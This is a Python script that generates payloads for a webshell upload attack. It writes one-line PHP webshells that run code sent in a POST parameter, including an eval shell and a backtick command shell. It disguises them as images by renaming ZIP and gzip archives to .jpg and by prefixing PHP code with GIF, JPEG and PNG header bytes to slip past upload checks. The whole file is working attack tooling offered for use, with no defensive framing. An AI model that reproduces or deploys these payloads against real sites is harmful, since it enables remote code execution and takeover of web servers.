#!/usr/bin/env python3
"""Create payloads for ZIP webshell upload attack."""

import zipfile
import os
import sys

OUT_DIR = "/tmp/zip_attack"
os.makedirs(OUT_DIR, exist_ok=True)

# 1. Create webshell
with open(os.path.join(OUT_DIR, "shell.php"), "w") as f:
    f.write('<?php @eval($_POST["a"]);?>')

# 2. Create ZIP
with zipfile.ZipFile(os.path.join(OUT_DIR, "shell.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT_DIR, "shell.php"), "shell.php")
print(f"ZIP created: {os.path.getsize(os.path.join(OUT_DIR, 'shell.zip'))} bytes")

# 3. Copy to .jpg
import shutil
shutil.copy(os.path.join(OUT_DIR, "shell.zip"), os.path.join(OUT_DIR, "shell.jpg"))
print(f"ZIP as JPG: {os.path.getsize(os.path.join(OUT_DIR, 'shell.jpg'))} bytes")

# 4. Create GIF89a PHP webshell
with open(os.path.join(OUT_DIR, "gifshell.jpg"), "wb") as f:
    f.write(b"GIF89a<?php @eval($_POST[\"a\"]);?>")
print(f"GIF+PHP shell: {os.path.getsize(os.path.join(OUT_DIR, 'gifshell.jpg'))} bytes")

# 5. Create minimal JPEG with PHP appended
with open(os.path.join(OUT_DIR, "jpegshell.jpg"), "wb") as f:
    # Minimal JPEG SOI marker + PHP code
    f.write(b"\xff\xd8\xff\xe0" + b"<?php @eval($_POST[\"a\"]);?>")
print(f"JPEG+PHP shell: {os.path.getsize(os.path.join(OUT_DIR, 'jpegshell.jpg'))} bytes")

# 6. Create PNG + PHP
with open(os.path.join(OUT_DIR, "pngshell.png"), "wb") as f:
    f.write(b"\x89PNG\r\n\x1a\n" + b"<?php @eval($_POST[\"a\"]);?>")
print(f"PNG+PHP shell: {os.path.getsize(os.path.join(OUT_DIR, 'pngshell.png'))} bytes")

# 7. Create password-protected ZIP
with zipfile.ZipFile(os.path.join(OUT_DIR, "protected.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.setpassword(b"test")
    zf.write(os.path.join(OUT_DIR, "shell.php"), "shell.php")
shutil.copy(os.path.join(OUT_DIR, "protected.zip"), os.path.join(OUT_DIR, "protected.jpg"))
print(f"Password-protected ZIP as JPG: {os.path.getsize(os.path.join(OUT_DIR, 'protected.jpg'))} bytes")

# 8. Simple text payload - just php info
with open(os.path.join(OUT_DIR, "infoshell.jpg"), "wb") as f:
    f.write(b"GIF89a<?php phpinfo();?>")
print(f"PHPInfo shell: {os.path.getsize(os.path.join(OUT_DIR, 'infoshell.jpg'))} bytes")

# 9. Minimal PHP payload with shorter code
with open(os.path.join(OUT_DIR, "minishell.jpg"), "wb") as f:
    f.write(b"GIF89a<?=`$_POST[a]`;?>")
print(f"Mini shell (backtick): {os.path.getsize(os.path.join(OUT_DIR, 'minishell.jpg'))} bytes")

# 10. Create a gzip compressed shell
import gzip
with gzip.open(os.path.join(OUT_DIR, "shell.gz"), "wb") as f:
    f.write(b'<?php @eval($_POST["a"]);?>')
shutil.copy(os.path.join(OUT_DIR, "shell.gz"), os.path.join(OUT_DIR, "shellgz.jpg"))
print(f"GZIP as JPG: {os.path.getsize(os.path.join(OUT_DIR, 'shellgz.jpg'))} bytes")

print("\nAll payloads created in", OUT_DIR)
